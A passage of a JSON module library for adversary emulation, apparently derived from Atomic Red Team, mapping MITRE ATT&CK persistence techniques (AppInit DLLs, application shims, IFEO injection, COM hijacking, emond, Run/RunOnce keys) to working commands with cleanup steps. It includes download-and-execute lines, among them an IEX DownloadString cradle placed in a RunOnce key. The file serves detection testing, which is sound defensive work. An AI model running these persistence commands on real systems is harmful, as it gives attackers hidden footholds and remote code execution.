        "cleanup_command": "reg.exe import \"#{registry_cleanup_file}\" >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "registry_file",
          "description": "Windows Registry File",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1546.010\\src\\T1546.010.reg"
        },
        {
          "name": "registry_cleanup_file",
          "description": "Windows Registry File",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1546.010\\src\\T1546.010-cleanup.reg"
        }
      ],
      "prerequisites": [
        {
          "description": "Reg files must exist on disk at specified locations (#{registry_file} and #{registry_cleanup_file})\n",
          "check_command": "if ((Test-Path \"#{registry_file}\") -and (Test-Path \"#{registry_cleanup_file}\")) {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"#{registry_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.010/src/T1546.010.reg\" -OutFile \"#{registry_file}\"\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.010/src/T1546.010-cleanup.reg\" -OutFile \"#{registry_cleanup_file}\"\n"
        },
        {
          "description": "DLL's must exist in the C:\\Tools directory (T1546.010.dll and T1546.010x86.dll)\n",
          "check_command": "if ((Test-Path c:\\Tools\\T1546.010.dll) -and (Test-Path c:\\Tools\\T1546.010x86.dll)) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory C:\\Tools -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.010/bin/T1546.010.dll\" -OutFile C:\\Tools\\T1546.010.dll\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.010/bin/T1546.010x86.dll\" -OutFile C:\\Tools\\T1546.010x86.dll\n"
        }
      ],
      "rx_module_id": "a58d9386-3080-4242-ab5f-454c16503d18",
      "module_name": "Install AppInit Shim"
    },
    {
      "index": 1253,
      "technique_id": "T1546.011",
      "technique_name": "Event Triggered Execution: Application Shimming",
      "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of RAGLOXShim complete.\" will be displayed. To verify the shim behavior, run \nthe RAGLOXTest.exe from the <PathToRagloxModulesFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"RAGLOX Shim DLL Test!\" as defined in the RAGLOXTest.dll. To better understand what is happening, review\nthe source code files is the <PathToRagloxModulesFolder>\\\\T1546.011\\\\src directory.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sdbinst.exe \"#{file_path}\"\n",
        "elevation_required": true,
        "cleanup_command": "sdbinst.exe -u \"#{file_path}\" >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "file_path",
          "description": "Path to the shim database file",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1546.011\\bin\\RAGLOXShimx86.sdb"
        }
      ],
      "prerequisites": [
        {
          "description": "Shim database file must exist on disk at specified location (#{file_path})\n",
          "check_command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"#{file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.011/bin/RAGLOXShimx86.sdb\" -OutFile \"#{file_path}\"\n"
        },
        {
          "description": "RAGLOXTest.dll must exist at c:\\Tools\\RAGLOXTest.dll\n",
          "check_command": "if (Test-Path c:\\Tools\\RAGLOXTest.dll) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path c:\\Tools\\RAGLOXTest.dll) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.011/bin/RAGLOXTest.dll\" -OutFile c:\\Tools\\RAGLOXTest.dll\n"
        }
      ],
      "rx_module_id": "9ab27e22-ee62-4211-962b-d36d9a0e6a18",
      "module_name": "Application Shim Installation"
    },
    {
      "index": 1254,
      "technique_id": "T1546.011",
      "technique_name": "Event Triggered Execution: Application Shimming",
      "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"$PathToRagloxModulesFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb\nCopy-Item \"$PathToRagloxModulesFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb -ErrorAction Ignore\nRemove-Item C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "aefd6866-d753-431f-a7a4-215ca7e3f13d",
      "module_name": "New shim database files created in the default shim database directory"
    },
    {
      "index": 1255,
      "technique_id": "T1546.011",
      "technique_name": "Event Triggered Execution: Application Shimming",
      "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"RAGLOXRedTeamT1546.011\" -Value \"RAGLOXRedTeamT1546.011\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"RAGLOXRedTeamT1546.011\" -Value \"RAGLOXRedTeamT1546.011\"\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"RAGLOXRedTeamT1546.011\" -ErrorAction Ignore\nRemove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"RAGLOXRedTeamT1546.011\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9b6a06f9-ab5e-4e8d-8289-1df4289db02f",
      "module_name": "Registry key creation and/or modification events for SDB"
    },
    {
      "index": 1256,
      "technique_id": "T1546.012",
      "technique_name": "Event Triggered Execution: Image File Execution Options Injection",
      "description": "Leverage Global Flags Settings\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /f >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "target_binary",
          "description": "Binary To Attach To",
          "type": "path",
          "default_value": "calc.exe"
        },
        {
          "name": "payload_binary",
          "description": "Binary To Execute",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "fdda2626-5234-4c90-b163-60849a24c0b8",
      "module_name": "IFEO Add Debugger"
    },
    {
      "index": 1257,
      "technique_id": "T1546.012",
      "technique_name": "Event Triggered Execution: Image File Execution Options Injection",
      "description": "Leverage Global Flags Settings\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /f >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "target_binary",
          "description": "Binary To Attach To",
          "type": "path",
          "default_value": "notepad.exe"
        },
        {
          "name": "payload_binary",
          "description": "Binary To Execute",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "46b1f278-c8ee-4aa5-acce-65e77b11f3c1",
      "module_name": "IFEO Global Flags"
    },
    {
      "index": 1258,
      "technique_id": "T1546.012",
      "technique_name": "Event Triggered Execution: Image File Execution Options Injection",
      "description": "The following RX Module will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe\n",
        "elevation_required": true,
        "cleanup_command": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nRemove-Item $registryPath -force\n"
      },
      "variables": [
        {
          "name": "process",
          "description": "Process to monitor\n",
          "type": "string",
          "default_value": "whoami.exe"
        },
        {
          "name": "cmd_to_run",
          "description": "Command to execute\n",
          "type": "string",
          "default_value": "cmd.exe /c calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "13117939-c9b2-4a43-999e-0a543df92f0d",
      "module_name": "GlobalFlags in Image File Execution Options"
    },
    {
      "index": 1259,
      "technique_id": "T1546.013",
      "technique_name": "Event Triggered Execution: PowerShell Profile",
      "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Add-Content #{ps_profile} -Value \"\"\nAdd-Content #{ps_profile} -Value \"Start-Process #{exe_path}\"\npowershell -Command exit\n",
        "elevation_required": false,
        "cleanup_command": "$oldprofile = cat $profile | Select-Object -skiplast 1\nSet-Content $profile -Value $oldprofile\n"
      },
      "variables": [
        {
          "name": "exe_path",
          "description": "Path the malicious executable",
          "type": "path",
          "default_value": "calc.exe"
        },
        {
          "name": "ps_profile",
          "description": "Powershell profile to use",
          "type": "string",
          "default_value": "$profile"
        }
      ],
      "prerequisites": [
        {
          "description": "Ensure a powershell profile exists for the current user\n",
          "check_command": "if (Test-Path #{ps_profile}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Path #{ps_profile} -Type File -Force\n"
        }
      ],
      "rx_module_id": "090e5aa5-32b6-473b-a49b-21e843a56896",
      "module_name": "Append malicious start-process cmdlet"
    },
    {
      "index": 1260,
      "technique_id": "T1546.014",
      "technique_name": "Event Triggered Execution: Emond",
      "description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo cp \"#{plist}\" /etc/emond.d/rules/T1546.014_emond.plist\nsudo touch /private/var/db/emondClients/T1546.014\n",
        "elevation_required": true,
        "cleanup_command": "sudo rm /etc/emond.d/rules/T1546.014_emond.plist\nsudo rm /private/var/db/emondClients/T1546.014\n"
      },
      "variables": [
        {
          "name": "plist",
          "description": "Path to attacker emond plist file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1546.014/src/T1546.014_emond.plist"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "23c9c127-322b-4c75-95ca-eff464906114",
      "module_name": "Persistance with Event Monitor - emond"
    },
    {
      "index": 1261,
      "technique_id": "T1546.015",
      "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
      "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dllpath}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta #{clsid}'",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Recurse -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "clsid_threading",
          "description": "Threading Model",
          "type": "string",
          "default_value": "Apartment"
        },
        {
          "name": "dllpath",
          "description": "Path to the DLL.",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\RAGLOXTest.dll"
        },
        {
          "name": "clsid",
          "description": "Class ID to hijack.",
          "type": "string",
          "default_value": "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
        },
        {
          "name": "clsid_description",
          "description": "Description for CLSID",
          "type": "string",
          "default_value": "MSAA AccPropServices"
        }
      ],
      "prerequisites": [
        {
          "description": "DLL For testing",
          "check_command": "if (Test-Path \"#{dllpath}\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.015/bin/RAGLOXTest.dll\" -OutFile \"#{dllpath}\"\n"
        }
      ],
      "rx_module_id": "48117158-d7be-441b-bc6a-d9e36e47b52b",
      "module_name": "COM Hijacking - InprocServer32"
    },
    {
      "index": 1262,
      "technique_id": "T1546.015",
      "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
      "description": "Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\"))\n$item = $o.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n",
        "elevation_required": false,
        "cleanup_command": "Get-Process -Name \"*calc\" | Stop-Process\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "752191b1-7c71-445c-9dbe-21bb031b18eb",
      "module_name": "Powershell Execute COM Object"
    },
    {
      "index": 1263,
      "technique_id": "T1546.015",
      "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
      "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dll_path}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Recurse -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "clsid_threading",
          "description": "Threading Model",
          "type": "string",
          "default_value": "Both"
        },
        {
          "name": "dll_path",
          "description": "Path to the DLL.",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1546.015_calc.dll"
        },
        {
          "name": "clsid",
          "description": "Class ID to hijack.",
          "type": "string",
          "default_value": "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
        },
        {
          "name": "clsid_description",
          "description": "Description for CLSID",
          "type": "string",
          "default_value": "MSAA AccPropServices"
        }
      ],
      "prerequisites": [
        {
          "description": "DLL For testing",
          "check_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.015/bin/T1546.015_calc.dll\" -OutFile \"#{dll_path}\"\n"
        }
      ],
      "rx_module_id": "123520cc-e998-471b-a920-bd28e3feafa0",
      "module_name": "COM Hijacking with RunDLL32 (Local Server Switch)"
    },
    {
      "index": 1264,
      "technique_id": "T1546.015",
      "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
      "description": "This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The\ntest is validated by running 'rundll32.exe -sta \"RAGLOXTest\"' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\RAGLOXTest\" /ve /T REG_SZ /d \"RAGLOXTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\RAGLOXTest.1.00\" /ve /T REG_SZ /d \"RAGLOXTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\RAGLOXTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\RAGLOXTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"RAGLOXTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"RAGLOXTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1546.015/src/TreatAs.sct\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"RAGLOXTest\" /f\n\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\n\nrundll32.exe -sta \"RAGLOXTest\" ",
        "elevation_required": false,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\RAGLOXTest\" /f\nreg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "33eacead-f117-4863-8eb0-5c6304fbfaa9",
      "module_name": "COM hijacking via TreatAs"
    },
    {
      "index": 1265,
      "technique_id": "T1547",
      "technique_name": "Boot or Logon Autostart Execution",
      "description": "Install a driver via pnputil.exe lolbin\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "pnputil.exe /add-driver \"#{driver_inf}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "driver_inf",
          "description": "A built-in, already installed windows driver inf",
          "type": "path",
          "default_value": "C:\\Windows\\INF\\usbstor.inf"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "cb01b3da-b0e7-4e24-bf6d-de5223526785",
      "module_name": "Add a driver"
    },
    {
      "index": 1266,
      "technique_id": "T1547",
      "technique_name": "Boot or Logon Autostart Execution",
      "description": "pnputil.exe is a native command-line utility in Windows to install drivers, this can be abused by to install malicious drivers. Ref: https://lolbas-project.github.io/lolbas/Binaries/Pnputil/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "pnputil.exe -i -a #{driver_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "driver_path",
          "description": "Enter the driver file path to install (Default is used built-in windows driver - acpipmi.inf)",
          "type": "path",
          "default_value": "C:\\Windows\\INF\\acpipmi.inf"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5cb0b071-8a5a-412f-839d-116beb2ed9f7",
      "module_name": "Driver Installation Using pnputil.exe"
    },
    {
      "index": 1267,
      "technique_id": "T1547",
      "technique_name": "Boot or Logon Autostart Execution",
      "description": "Virtual Channels can be leveraged to alter RDP behavior using dedicated Addins.The mechanism is implemented using DLLs which can be executed during RDP session automatically. \nThe DLLs are loaded in the host system only after successful connection is established with the remote system.\nOnce the test is run, amsi.dll will be loaded on the host system during successful RDP session.\nBlog :https://learn.microsoft.com/en-us/windows/win32/termserv/terminal-services-virtual-channels?redirectedfrom=MSDN\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\\Addins\\#{Subkey_Added}\" /v Name /t REG_SZ /d \"#{dll_inf}\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\\Addins\\#{Subkey_Added}\" /f      "
      },
      "variables": [
        {
          "name": "Subkey_Added",
          "description": "New Sub key added in the registry path",
          "type": "String",
          "default_value": "Malware"
        },
        {
          "name": "dll_inf",
          "description": "custom DLL to be executed",
          "type": "Path",
          "default_value": "C:\\Windows\\System32\\amsi.dll"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "fdd45306-74f6-4ade-9a97-0a4895961228",
      "module_name": "Leverage Virtual Channels to execute custom DLL during successful RDP session"
    },
    {
      "index": 1268,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"RAGLOX Threat Library\\\" to the Run key. Output will be via stdout. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"RAGLOX Threat Library\" /t REG_SZ /F /D \"#{command_to_execute}\"\n",
        "elevation_required": false,
        "cleanup_command": "REG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"RAGLOX Threat Library\" /f >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "command_to_execute",
          "description": "Thing to Run",
          "type": "path",
          "default_value": "C:\\Path\\RAGLOXRedTeam.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e55be3fd-3521-4610-9d1a-e210e42dcf05",
      "module_name": "Reg Key Run"
    },
    {
      "index": 1269,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load RAGLOXRedTeam.dll to RunOnceEx. Output will be via stdout. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"#{thing_to_execute}\"\n",
        "elevation_required": true,
        "cleanup_command": "REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "thing_to_execute",
          "description": "Thing to Run",
          "type": "path",
          "default_value": "C:\\Path\\RAGLOXRedTeam.dll"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "554cbd88-cde1-4b56-8168-0be552eed9eb",
      "module_name": "Reg Key RunOnce"
    },
    {
      "index": 1270,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1547.001/src/Discovery.bat`\")\"'\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "thing_to_execute",
          "description": "Thing to Run",
          "type": "path",
          "default_value": "powershell.exe"
        },
        {
          "name": "reg_key_path",
          "description": "Path to registry key to update",
          "type": "path",
          "default_value": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
        }
      ],
      "prerequisites": [],
